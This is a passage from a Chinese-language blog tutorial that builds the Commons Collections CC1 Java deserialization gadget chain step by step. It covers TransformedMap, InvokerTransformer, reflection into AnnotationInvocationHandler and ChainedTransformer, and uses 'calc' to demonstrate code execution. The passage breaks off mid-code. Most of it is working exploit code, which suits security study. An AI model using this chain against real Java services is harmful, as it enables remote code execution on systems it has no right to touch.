<p>编写代码。我们看到，最后是要调用<code>TransformedMap.checkSetValue()</code>，从而调用<code>TransformedMap.checkSetValue()</code>方法体中的<code>valueTransformer.transform(value);</code>。查看代码，实际上是只对<code>Value</code>进行操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">// decorate的第一个参数是map，后两个参数是两个Transformer。</span></span><br><span class="line">        TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); <span class="comment">// 将第二个参数设为我们的invokerTransformer。</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>我们从<code>decorate</code>切入，其在运行<code>TransformedMap.decorate()</code>时，会返回一个新的<code>TransformedMap</code>对象，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看构造函数，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会将我们传入的<code>invokerTransformer</code>赋值给<code>this.valueTransformer</code>。这样，如果调用<code>checkSetValue</code>的话，就会运行<code>invokerTransformer.transfrom</code>了。这里的<code>value</code>如果可控就可以实现RCE。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找第二步调用"><a href="#找第二步调用" class="headerlink" title="找第二步调用"></a>找第二步调用</h4><p>那么这里就得看哪里调用了<code>checkSetValue</code>。ctrl+alt+F7，发现只有一处调用了这个函数，即<code>MapEntry.setValue()</code>，继承了<code>AbstractInputCheckedMapDecorator</code>。<code>AbstractInputCheckedMapDecorator</code>是一个抽象类，继承了<code>AbstractMapDecorator</code>（注：<code>TransformedMap</code>继承了<code>AbstractInputCheckedMapDecorator</code>）。</p>
<p>MapEntry.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再查看这个<code>setValue</code>的调用。很多都调用了这个代码。所以需要进行一个理解。首先看类名，<code>MapEntry</code>，一个entry就是一个键值对的值。比如下面这个代码例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Map.Entry entry:map.entrySet())&#123;</span><br><span class="line">    entry.getValue();</span><br><span class="line">    entry.setValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一个经典的遍历键值对的例子。<code>entry</code>代表一个键值对。再查看这个方法，发现这个<code>setValue</code>就是重写了这个方法。也就是说，只要遍历我们上面经过<code>decorate()</code>处理过的map，就能触发<code>setValue</code>方法。因为<code>TransformedMap</code>没有<code>setValue</code>方法，就会去找其父类的<code>setValue</code>方法，也即<code>AbstractInputCheckedMapDecorator.setValue</code>方法，就会调用<code>TransformedMap.checkSetValue</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry entry: transformedMap.entrySet())&#123;</span><br><span class="line">        entry.setValue(r); <span class="comment">// 将Runtime对象传进去，最后变为invokeTransformer.transform()的参数，达成反射，弹计算器。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这代表这条链是可以用的。已经成功一半了。<strong>之后只要找到有遍历数组的地方，且它调用了setValue()即可执行后半条链</strong>。</p>
<h4 id="找第三步调用"><a href="#找第三步调用" class="headerlink" title="找第三步调用"></a>找第三步调用</h4><p>最好的结果是找<code>readObject()</code>方法里就有调用<code>setValue()</code>的。直接对<code>setValue()</code>进行Find Usages，一个个找，然后发现：</p>
<p><code>sun.reflect.annotation</code>包下有一个<code>AnnotationInvocationHandler</code>类，类中有<code>readObject()</code>，调用了<code>setValue()</code>。</p>
<p>AnnotationInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                    value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，这个类完全符合要求。首先看这个<code>AnnotationInvocationHandler</code>类的构造函数。</p>
<p>AnnotationInvocationHandler.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues</code>这两个都是完全可控的。</p>
<p>分析<code>Class&lt;? extends Annotation&gt; type</code>，其继承自<code>Annotation</code>，也就是注解。例：<code>@Override</code>就是一个Annotation。<code>Map&lt;String, Object&gt; memberValues</code>就直接是一个Map。可以直接将上面构造好的Map传进去。</p>
<h4 id="没写Public的类怎么办？"><a href="#没写Public的类怎么办？" class="headerlink" title="没写Public的类怎么办？"></a>没写Public的类怎么办？</h4><p>注意，这个<code>AnnotationInvocationHandler</code>的类没有被public修饰。也就是说，它是默认的<strong>default</strong>修饰的。这说明只有在同一个包的类中才能访问到这个类，也就是说，<strong>我们需要用反射的方式获取这个类</strong>。</p>
<p>没法先先实例化这个类再对这个对象<code>getClass()</code>的话，就可以直接用包名。<code>Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</code>即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>); <span class="comment">// 选取包名</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class); <span class="comment">// 获取构造函数</span></span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置构造函数可访问</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap); <span class="comment">// 实例化一个类，传入构造函数参数（注意，transformedMap是之前我们构造好的Map。）</span></span><br></pre></td></tr></table></figure>

<p>目前，这个Exp存在着3个问题。</p>
<ol>
<li>Runtime对象是自己生成的；而Runtime是无法被序列化的。</li>
<li>AnnotationInvocationHandler.readObject()中<code>setValue()</code>方法的参数是<code>new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name))</code>，这块儿是控制不了的。</li>
<li>AnnotationInvocationHandler.readObject()中需要满足两个if条件。</li>
</ol>
<h4 id="解决第一个问题：如何解决Runtime对象无法序列化？"><a href="#解决第一个问题：如何解决Runtime对象无法序列化？" class="headerlink" title="解决第一个问题：如何解决Runtime对象无法序列化？"></a>解决第一个问题：如何解决Runtime对象无法序列化？</h4><p>虽然Runtime没法被序列化，但是Runtime.class可以被序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class; <span class="comment">// 获取 Runtime 类的 Class 对象。</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>); <span class="comment">// 通过 getMethod 方法获取 Runtime 类中名为 getRuntime 的方法对象。由于 getRuntime 方法是静态方法且无参数，因此第二个参数传入 null。</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>); <span class="comment">// 通过 invoke 方法调用 getRuntime 方法，获取 Runtime 对象。由于 getRuntime 是静态方法，所以第一个参数传入 null 表示调用者对象为 null。</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class); <span class="comment">// 通过 getMethod 方法获取 Runtime 类中名为 exec 的方法对象，该方法接受一个 String 类型的参数，表示要执行的命令。</span></span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>); <span class="comment">// 通过 invoke 方法调用 exec 方法，执行命令 &quot;calc&quot;。这里会打开计算器程序（在 Windows 系统中）。</span></span><br></pre></td></tr></table></figure>
<p>接下来，需要把这个改成之前的利用链。首先：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure>
<p>（回想起一开始的调用方法：<code>new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code>）</p>
<p>我们发现，<code>Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;,null);</code>这里对<code>Runtime.class</code>（即<code>c</code>）调用了<code>getMethod</code>方法，那么就是在这里进行这段话的调用。我们点进<code>c.getMethod</code>，查看其参数。其参数为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String name, Class&lt;?&gt;... parameterTypes</span><br></pre></td></tr></table></figure>
<p>那么，所对应的<code>InvokerTransformer</code>的第二个参数（即“参数类型”参数）即为一个字符串类和一个Class数组类，即<code>String.class, Class[].class</code>。</p>
<p>对于第三个参数（即“参数（args）”参数）来说，我们的<code>c.getMethod(&quot;getRuntime&quot;,null)</code>传入了两个参数，<code>&quot;getRuntime&quot;,null</code>，那么直接new一个Object数组放进去即可。</p>
<p>可得改写为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure>

<p>这就是<code>c.getMethod(&quot;getRuntime&quot;,null);</code>通过<code>InvokerTransformer</code>来表示的方式。原Exp的那一句就可以写成：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure>
<p>注意强制类型转换。</p>
<p>下一步是转换这段代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
<p>转换为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br></pre></td></tr></table></figure>
<p>完全一样。首先，我们需要调用的是<code>getRuntimeMethod.invoke</code>方法，所以<code>transform(getRuntimeMethod)</code>，<code>InvokerTransformer</code>的第一个参数为<code>&quot;invoke&quot;</code>。然后，看<code>invoke</code>接收的参数，发现是一个<code>Object</code>对象，一个<code>Object数组</code>。把这个函数相应的参数放到第三个参数的<code>Object数组</code>里即可。</p>
<p>接下来，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>这两句并不是可以需要苦哈哈再写下面这种了，而是刚才直接获取了<code>Runtime</code>，能直接用<code>Runtime.exec()</code>来解决。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>, String.class&#125;).transform(getRuntimeMethod);</span><br></pre></td></tr></table></figure>
<p>也就是可以直接用这一步来办：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>

<p>总的代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>
<p>这个就是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class; </span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>); </span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>); </span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class); </span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>); </span><br></pre></td></tr></table></figure>
<p>的可序列化版本。运行，直接弹计算器了。</p>
<h4 id="Transform的优化"><a href="#Transform的优化" class="headerlink" title="Transform的优化"></a>Transform的优化</h4><p>这个是类似“一前一后”的调用。如果要完成全部的反序列化链要写很多代码，但是看到之前有一个<code>ChainedTransformer</code>类。其构造函数如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    FunctorUtils.validate(transformers);</span><br><span class="line">    <span class="keyword">if</span> (transformers.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> NOPTransformer.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">    transformers = FunctorUtils.copy(transformers);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传入一个<code>Transformer[]</code>，其<code>transform()</code>方法可以完成对transformer的递归调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可将上面的三行优化到一起：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>
<p>一开始传入一个<code>Runtime.class</code>，后面接着递归调用即可。这就是只调用了一个<code>transform</code>。</p>
<p>现在的代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 